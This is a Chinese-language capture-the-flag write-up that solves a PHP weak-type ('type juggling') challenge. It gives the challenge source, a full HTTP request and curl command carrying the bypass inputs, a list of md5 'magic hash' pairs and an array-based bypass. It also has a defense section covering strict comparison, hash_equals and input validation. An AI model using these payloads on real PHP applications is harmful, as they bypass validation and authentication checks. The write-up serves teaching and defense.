# PHP 弱类型三关 — WriteUp

- 分类：Web / PHP 弱类型（Type Juggling）
- 入口：`http://103.163.47.230:32849`（动态容器，提交后已过期）
- Flag：`HTUCTF{6b60ba96-3899-4131-9816-ba0225b42741}`
- 附件：`index.php`（题目源码，页面 `highlight_file(__FILE__)` 直接给出）

## 1. 题目源码

```php
<?php
include("flag.php");
highlight_file(__FILE__);

$pass1 = isset($_GET['a'])
    && $_GET['a'] !== "admin"
    && $_GET['a'][0] == "admin";

$pass2 = isset($_GET['num'])
    && strlen($_GET['num']) < 5
    && $_GET['num'] > 10000;

$pass3 = isset($_POST['x'], $_POST['y'])
    && $_POST['x'] !== $_POST['y']
    && md5($_POST['x']) == md5($_POST['y']);

if ($pass1 && $pass2 && $pass3) {
    echo "三关全过，算你有点东西，flag 拿去。";
    echo $flag;
} else {
    echo "就这？三关都过不去，还想拿 flag？";
}
```

三关全部建立在同一个根因上：**混用了 `!==`（严格比较，不转换类型）和 `==`（宽松比较，先转换类型再比较）**。
出题人想让两个条件"自相矛盾"，但 PHP 的 `==` 会在比较前做类型转换，于是矛盾被消解。

## 2. 通关 Payload

### 2.1 Burp Repeater（完整报文）

三关的条件可以塞进**同一个请求**：query 带 `a[]` 与 `num`，body 带 `x` / `y`。
在 Repeater 里右键 → **Change request method** → POST（会自动补 `Content-Type`）：

```http
POST /?a%5B%5D=admin&num=1e9 HTTP/1.1
Host: 103.163.47.230:32849
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close

x=QNKCDZO&y=240610708
```

Response：

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

```
三关全过，算你有点东西，flag 拿去。HTUCTF{6b60ba96-3899-4131-9816-ba0225b42741}
```

> `[]` 建议编码成 `%5B%5D`，避免个别代理改写 query。

### 2.2 等价命令

```bash
curl -X POST "http://103.163.47.230:32849/?a[]=admin&num=1e9" \
     -d "x=QNKCDZO&y=240610708"
```

或：

```bash
python solve_php_weak_type.py            # 打靶机
python solve_php_weak_type.py --check    # 离线自检 payload 是否成立
```

回显：

```
三关全过，算你有点东西，flag 拿去。HTUCTF{6b60ba96-3899-4131-9816-ba0225b42741}
```

## 3. 逐关拆解

### 第 1 关：数组 vs 字符串 —— `$_GET['a'] !== "admin" && $_GET['a'][0] == "admin"`

| 传入 | `$_GET['a']` | `!== "admin"` | `[0]` | `[0] == "admin"` |
|---|---|---|---|---|
| `a=admin` | 字符串 `"admin"` | ✗（相等） | `"a"`（字符串偏移量取首字符） | ✗ |
| `a[]=admin` | 数组 `[0=>"admin"]` | ✓（数组 ≠ 字符串） | `"admin"` | ✓ |

`[]=` 是 PHP 的"追加数组元素"语法，`?a[]=admin` 拿到的是数组。
关键差异：`!==` 比较的是**整个变量**（数组 vs 字符串，类型不同直接为真），`==` 比较的是**第 0 个元素**（字符串 vs 字符串，内容相同为真）。
想让"不等于 admin"和"第 0 项等于 admin"同时成立，唯一办法就是让这两处比较的不是同一个东西 —— 数组正好提供了这个"错位"。

### 第 2 关：科学计数法绕过长度检查 —— `strlen(num) < 5 && num > 10000`

`num=1e9`：

- `strlen("1e9")` = **3** `< 5` ✔ —— 长度检查看的是**字符串**
- `"1e9" > 10000` —— 字符串与整数弱比较，字符串先转成数字：`1e9` → `1000000000.0` > 10000 ✔

同一个值在两处被当成不同类型处理：`strlen()` 按字符串量长度，`>` 按数字比大小。
同理 `num=9e9`、`num=1e5` 也行；反过来 `num=99999` 数值够但长度 5，过不了。
（PHP 7 起十六进制串 `"0xFF"` 不再是数字字符串，不能再用。）

### 第 3 关：md5 0e 幻数碰撞 —— `x !== y && md5(x) == md5(y)`

```
md5("QNKCDZO")   = 0e830400451993494058024219903391
md5("240610708") = 0e462097431906509019562988736854
```

两个哈希都是 `0e` + 纯数字。用 `==` 比较时，PHP 认为两边都是**数字字符串**，转成浮点数：
`0e830...` 和 `0e462...` 都是 `0 × 10^n` = **0.0**，于是 `0.0 == 0.0` 成立，而原始输入 `x !== y` 也成立。

这类"哈希结果是 `0e<纯数字>`"的输入被称为 **magic hash**。常用对（可互相替换）：

| x | y |
|---|---|
| `QNKCDZO` | `240610708` |
| `s878926199a` | `s155964671a` |
| `s1091221200a` | `s1885207154a` |
| `s1502113478a` | `s1885207154a` |
| `s1836677006a` | `s155964671a` |

补充打法（视 PHP 版本而定）：

- **数组法**：`x[]=1&y[]=2`。`md5(数组)` 在 PHP 5/7 返回 `NULL` 并报 Warning，`NULL == NULL` 为真；PHP 8 会抛 `TypeError`，本题（有正常回显）优先用 0e 对。
- 若题目是 `md5(x) === md5(y)`（严格比较），0e 对失效，需要用真正的**二进制 MD5 碰撞**（如经典的 `d131dd02...` 那一对，字节不同但 md5 完全相同）。

## 4. 知识点小结：PHP 弱类型速查

| 场景 | 表现 | 例子 |
|---|---|---|
| 数字字符串 vs 数字 | 转为数字比较 | `"1e9" > 10000` → true |
| 前导/后缀字符 | 取前缀数字，全非数字则 0 | `"123abc" == 123` → true（PHP 7）；`"abc" == 0` → true |
| `0e` 哈希 | 转 float 均为 0 | `md5('QNKCDZO') == md5('240610708')` → true |
| 数组 vs 字符串 | 数组大于任何非数组 | `[] == "admin"` → false，但 `[] !== "admin"` → true |
| `strcmp`/`md5` 传数组 | 返回 NULL（PHP 5/7） | `strcmp([], "a") == 0` → true |
| `in_array`/`array_search` 默认非严格 | 类型被转换 | `in_array("1e9", [10000])` 需留意 |

一句话记忆：**`==` 先转类型再比，`===` 先比类型；任何"既要求 A 又要求非 A"的校验，只要两边用了不同的比较符，就先想想能不能让它们比较的不是同一个东西。**

## 5. 踩坑

- 页面用 `highlight_file()` 输出源码，`<pre><code>` 里全是 `<span>`，直接 `grep` 不到内容，取 flag 前要先剥 HTML 标签（脚本里 `strip_tags`）。
- 三个条件必须**同一个请求**里同时满足：`a`/`num` 走 GET，`x`/`y` 走 POST，所以是 `POST /?a[]=admin&num=1e9` + `x/y` 表单体，拆成两次请求不会通过。
- 动态容器有生命周期，隔一段时间再访问会直接连接被重置（`RemoteDisconnected`），脚本里已捕获并给出提示。

## 6. 防御

- 类型不确定时一律用 `===` / `!==`，并且先 `is_string()` / `is_int()` 校验入参类型，不接受数组。
- 比较哈希用 `hash_equals()`（恒定时间 + 严格比较），不要 `==`。
- 数值范围校验先转类型再比长度：`$n = filter_input(INPUT_GET, 'num', FILTER_VALIDATE_INT)`，避免"字符串长度"和"数值大小"各判一套。
- PHP 8 已经收紧了很多弱比较（如字符串 vs 数字的比较规则），升级运行时能顺带消掉一大类这类问题。
